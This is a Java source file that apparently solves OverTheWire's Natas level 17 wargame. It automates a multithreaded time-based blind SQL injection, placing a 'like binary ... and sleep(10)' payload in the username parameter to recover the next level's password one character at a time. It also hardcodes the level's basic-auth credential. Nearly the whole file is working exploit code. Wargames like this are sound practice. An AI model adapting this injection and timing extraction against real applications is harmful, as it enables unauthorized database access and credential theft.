package net.leirahjelle.playground;

import org.apache.http.HttpResponse;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URIBuilder;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;

import java.net.URISyntaxException;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.*;
import java.util.stream.IntStream;

public class Natas17 extends NatasLevel {

    public Natas17() {
        super(4);
    }

    public Natas17(int threads) {
        super(threads);
    }

    @Override
    String findPassword() throws InterruptedException, ExecutionException {
        String allCharacters = fromCharCode(IntStream.rangeClosed(38,127).toArray())
                .replace("%", "")
                .replace("_", "");
//        System.out.println("Looping characters: "+allCharacters);

        String password = "";
        String nextChar;
        do {
            System.out.print("\rCurrent password found: "+password);
            nextChar = "";
            List<Task> tasks = new LinkedList<>();
            for (int i = 0; i < allCharacters.length(); i++) {
                try {
                    Task task = createTask(password, allCharacters.charAt(i));
                    tasks.add(task);
                } catch (URISyntaxException e) {
                    e.printStackTrace();
                }
            }
            nextChar = runTasks(tasks);
//            System.out.println(String.format("%nNext char in password: '%s'", nextChar));
            password += nextChar;

        } while (!nextChar.isEmpty());

        executor.shutdown();
        System.out.println("\nCompleted!");
        return password;
    }

    private String runTasks(List<Task> tasks) throws ExecutionException, InterruptedException {
        List<Future<String>> futures = new LinkedList<>();
        for (Task task : tasks) {
            futures.add(executor.submit(task));
        }
        String nextChar = "";
        boolean isAllTasksFinished;
        do {
            isAllTasksFinished = true;
//            System.out.println("While top-loop, active executors: "+executor.getActiveCount());
            for (Future<String> future : futures) {

                if (future.isDone()) {
                    String result = future.get();
                    if (!result.isEmpty()) {
                        nextChar = result;
                        cancelRemainingTasks(futures);
                        break;
                    }
                }

                if (!future.isCancelled() && !future.isDone()) {
//                    System.out.println("All tasks not finished yet, active executors: "+executor.getActiveCount());
                    isAllTasksFinished = false;
                }
            }
            Thread.sleep(10);
        } while(nextChar.isEmpty() && !isAllTasksFinished);
        return nextChar;
    }

    private void cancelRemainingTasks(List<Future<String>> futures) {
//        System.out.println("Cancelling remaining tasks");
        for (Future<String> future : futures) {
            if (!future.isDone() && !future.isCancelled()) {
                future.cancel(true);
            }
        }
    }

    private Task createTask(String currentPassword, char charToTest) throws URISyntaxException {
//        System.out.println("Testing: "+charToTest);
        String attempt = currentPassword + charToTest;
        CredentialsProvider provider = new BasicCredentialsProvider();
        provider.setCredentials(AuthScope.ANY, new UsernamePasswordCredentials("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"));
        CloseableHttpClient httpClient = HttpClientBuilder.create()
                .setDefaultCredentialsProvider(provider)
                .build();

        URIBuilder builder = new URIBuilder("http://natas17.natas.labs.overthewire.org/index.php");
        builder.addParameter("debug", "true");
        builder.addParameter("username", "natas18\" and password like binary '"+ attempt +"%' and sleep(10)#");

        String uri = builder.build().toASCIIString();
//        System.out.println("Testing uri: "+uri);
//        System.out.println("Testing param: "+builder.getQueryParams());
        HttpGet request = new HttpGet(uri);

        return new Task(httpClient, request, (HttpResponse response, long requestTime) -> {
            if (requestTime >= 10 * 1000) {
//                System.out.println("Got match for: "+charToTest);
                return String.valueOf(charToTest);
            }
            return "";
        });
    }
}
